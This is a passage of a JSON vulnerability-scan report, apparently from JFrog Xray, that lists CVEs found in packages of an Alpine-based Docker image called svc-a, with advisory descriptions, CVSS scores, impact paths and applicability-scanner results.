                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21619",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2022-10-24T00:00:00.490Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21619",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-522597",
                    "summary": "A vulnerability was found in libX11. The security flaw occurs because the functions in src/InitExt.c in libX11 do not check that the values provided for the Request, Event, or Error IDs are within the bounds of the arrays that those functions write to, using those IDs as array indexes. They trust that they were called with values provided by an Xserver adhering to the bounds specified in the X11 protocol, as all X servers provided by X.Org do. As the protocol only specifies a single byte for these values, an out-of-bounds value provided by a malicious server (or a malicious proxy-in-the-middle) can only overwrite other portions of the Display structure and not write outside the bounds of the Display structure itself, possibly causing the client to crash with this memory corruption.",
                    "description": "A vulnerability was found in libX11. The security flaw occurs because the functions in src/InitExt.c in libX11 do not check that the values provided for the Request, Event, or Error IDs are within the bounds of the arrays that those functions write to, using those IDs as array indexes. They trust that they were called with values provided by an Xserver adhering to the bounds specified in the X11 protocol, as all X servers provided by X.Org do. As the protocol only specifies a single byte for these values, an out-of-bounds value provided by a malicious server (or a malicious proxy-in-the-middle) can only overwrite other portions of the Display structure and not write outside the bounds of the Display structure itself, possibly causing the client to crash with this memory corruption.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-3138",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-06-29T00:00:00.111Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libx11:1.6.12-r1"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libx11:1.6.12-r1",
                            "cve_id": "CVE-2023-3138",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable function <code>XQueryExtension()</code> is called.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libx11:1.6.12-r1",
                            "vulnerability_id": "CVE-2023-3138",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-127110",
                    "summary": "A flaw was found in the way NSS handled CCS (ChangeCipherSpec) messages in TLS 1.3. This flaw allows a remote attacker to send multiple CCS messages, causing a denial of service for servers compiled with the NSS library. The highest threat from this vulnerability is to system availability. This flaw affects NSS versions before 3.58.",
                    "description": "A flaw was found in the way NSS handled CCS (ChangeCipherSpec) messages in TLS 1.3. This flaw allows a remote attacker to send multiple CCS messages, causing a denial of service for servers compiled with the NSS library. The highest threat from this vulnerability is to system availability. This flaw affects NSS versions before 3.58.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-25648",
                            "cwe": [
                                "CWE-770"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-10-21T00:00:00.829Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-25648",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-183308",
                    "summary": "The Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.18.5 and 1.19.x before 1.19.3 has a NULL pointer dereference in kdc/do_tgs_req.c via a FAST inner body that lacks a server field.",
                    "description": "The Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.18.5 and 1.19.x before 1.19.3 has a NULL pointer dereference in kdc/do_tgs_req.c via a FAST inner body that lacks a server field.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-37750",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v2": "4.0/CVSS:2.0/AV:N/AC:L/Au:S/C:N/I:N/A:P",
                            "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2021-08-24T00:00:00.344Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-37750",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-183483",
                    "summary": "ASN.1 strings are represented internally within OpenSSL as an ASN1_STRING structure which contains a buffer holding the string data and a field holding the buffer length. This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own \"d2i\" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the \"data\" and \"length\" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the \"data\" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit. This might result in a crash (causing a Denial of Service attack). It could also result in the disclosure of private memory content...",
                    "description": "ASN.1 strings are represented internally within OpenSSL as an ASN1_STRING structure which contains a buffer holding the string data and a field holding the buffer length. This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own \"d2i\" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the \"data\" and \"length\" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the \"data\" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit. This might result in a crash (causing a Denial of Service attack). It could also result in the disclosure of private memory content...",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-3712",
                            "cwe": [
                                "CWE-125"
                            ],
                            "cvss_v2": "5.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:P",
                            "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H"
                        }
                    ],
                    "created": "2021-08-25T00:00:00.038Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2021-3712",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the <code>ASN1_STRING</code> structure is created by searching for the existence of all the functions that create the <code>ASN1_STRING</code> structure or other structures that are based on the <code>ASN1_STRING</code> structure:</p>\n<ul>\n<li>ASN1_STRING_new()<br />\nASN1_STRING_type_new()<br />\nASN1_OCTET_STRING_new()<br />\nASN1_BIT_STRING_new()<br />\nASN1_INTEGER_new()<br />\nASN1_ENUMERATED_new()<br />\nASN1_UTF8STRING_new()<br />\nASN1_IA5STRING_new()<br />\nASN1_UNIVERSALSTRING_new()<br />\nASN1_BMPSTRING_new()<br />\nASN1_GENERALSTRING_new()<br />\nASN1_T61STRING_new()<br />\nASN1_VISIBLESTRING_new()<br />\nASN1_PRINTABLESTRING_new()<br />\nASN1_PRINTABLE_new()<br />\nDIRECTORYSTRING_new()<br />\nDISPLAYTEXT_new()  <br />\nASN1_GENERALIZEDTIME_new()<br />\nASN1_UTCTIME_new()<br />\nASN1_TIME_new()</li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2021-3712",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the <code>ASN1_STRING</code> structure is created by searching for the existence of all the functions that create the <code>ASN1_STRING</code> structure or other structures that are based on the <code>ASN1_STRING</code> structure:</p>\n<ul>\n<li>ASN1_STRING_new()<br />\nASN1_STRING_type_new()<br />\nASN1_OCTET_STRING_new()<br />\nASN1_BIT_STRING_new()<br />\nASN1_INTEGER_new()<br />\nASN1_ENUMERATED_new()<br />\nASN1_UTF8STRING_new()<br />\nASN1_IA5STRING_new()<br />\nASN1_UNIVERSALSTRING_new()<br />\nASN1_BMPSTRING_new()<br />\nASN1_GENERALSTRING_new()<br />\nASN1_T61STRING_new()<br />\nASN1_VISIBLESTRING_new()<br />\nASN1_PRINTABLESTRING_new()<br />\nASN1_PRINTABLE_new()<br />\nDIRECTORYSTRING_new()<br />\nDISPLAYTEXT_new()  <br />\nASN1_GENERALIZEDTIME_new()<br />\nASN1_UTCTIME_new()<br />\nASN1_TIME_new()</li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2021-3712",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2021-3712",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-100602",
                    "summary": "An issue was discovered in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31. There is a stack consumption vulnerability resulting from infinite recursion in the functions next_is_type_qual() and cplus_demangle_type() in cp-demangle.c. Remote attackers could leverage this vulnerability to cause a denial-of-service via an ELF file, as demonstrated by nm.",
                    "description": "An issue was discovered in cp-demangle.c in GNU libiberty, as distributed in GNU Binutils 2.31. There is a stack consumption vulnerability resulting from infinite recursion in the functions next_is_type_qual() and cplus_demangle_type() in cp-demangle.c. Remote attackers could leverage this vulnerability to cause a denial-of-service via an ELF file, as demonstrated by nm.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2018-18701",
                            "cwe": [
                                "CWE-835"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-06-14T00:00:00.079Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libgcc:8.3.0-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libstdc++:8.3.0-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2018-18701",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-260125",
                    "summary": "During RSA key generation, bignum implementations used a variation of the Binary Extended Euclidean Algorithm which entailed significantly input-dependent flow. This allowed an attacker able to perform electromagnetic-based side channel attacks to record traces leading to the recovery of the secret primes. *Note:* An unmodified Firefox browser does not generate RSA keys in normal operation and is not affected, but products built on top of it might. This vulnerability affects Firefox < 78.",
                    "description": "During RSA key generation, bignum implementations used a variation of the Binary Extended Euclidean Algorithm which entailed significantly input-dependent flow. This allowed an attacker able to perform electromagnetic-based side channel attacks to record traces leading to the recovery of the secret primes. *Note:* An unmodified Firefox browser does not generate RSA keys in normal operation and is not affected, but products built on top of it might. This vulnerability affects Firefox < 78.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-12402",
                            "cwe": [
                                "CWE-203"
                            ],
                            "cvss_v2": "1.2/CVSS:2.0/AV:L/AC:H/Au:N/C:P/I:N/A:N",
                            "cvss_v3": "4.4/CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2022-10-28T00:00:00.938Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-12402",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190232",
                    "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_i function",
                    "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_i function",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42378",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                            "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.850Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `getvar_i` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2021-42378",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2021-42378",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42378",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42378",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-127223",
                    "summary": "In Network Security Services (NSS) before 3.46, several cryptographic primitives had missing length checks. In cases where the application calling the library did not perform a sanity check on the inputs it could result in a crash due to a buffer overflow.",
                    "description": "In Network Security Services (NSS) before 3.46, several cryptographic primitives had missing length checks. In cases where the application calling the library did not perform a sanity check on the inputs it could result in a crash due to a buffer overflow.",
                    "issue_type": "security",
                    "severity": "Critical",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2019-17006",
                            "cwe": [
                                "CWE-20",
                                "CWE-119"
                            ],
                            "cvss_v2": "10.0/CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C",
                            "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2020-10-25T00:00:00.244Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:nss:3.44.3-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:nss:3.44.3-r0",
                            "cve_id": "CVE-2019-17006",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the following vulnerable libnss functions are used:</p>\n<ul>\n<li>\n<p><code>C_DecryptInit</code></p>\n</li>\n<li>\n<p><code>C_EncryptInit</code></p>\n</li>\n<li>\n<p><code>C_UnwrapKey</code></p>\n</li>\n<li>\n<p><code>C_WrapKey</code></p>\n</li>\n</ul>\n<p>In addition, the scanner checks if the following functions are used to retrieve the function list:</p>\n<ul>\n<li>\n<p><code>C_GetInterface</code></p>\n</li>\n<li>\n<p><code>C_GetFunctionList</code></p>\n</li>\n<li>\n<p><code>C_GetInterfaceList</code></p>\n</li>\n</ul>\n<p>An additional condition, which the scanner does not check, is that the function list is used to call the following vulnerable functions:</p>\n<ul>\n<li>\n<p><code>AES_CreateContext</code></p>\n</li>\n<li>\n<p><code>AES_InitContext</code></p>\n</li>\n<li>\n<p><code>ChaCha20Poly1305_Open</code></p>\n</li>\n<li>\n<p><code>RSA_EncryptBlock</code></p>\n</li>\n<li>\n<p><code>RSA_EncryptRaw</code></p>\n</li>\n<li>\n<p><code>RSA_Sign</code></p>\n</li>\n<li>\n<p><code>RSA_SignRaw</code></p>\n</li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable libnss functions were not found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:nss:3.44.3-r0",
                            "vulnerability_id": "CVE-2019-17006",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-194158",
                    "summary": "lookup in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "description": "lookup in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-22825",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-01-11T00:00:00.459Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
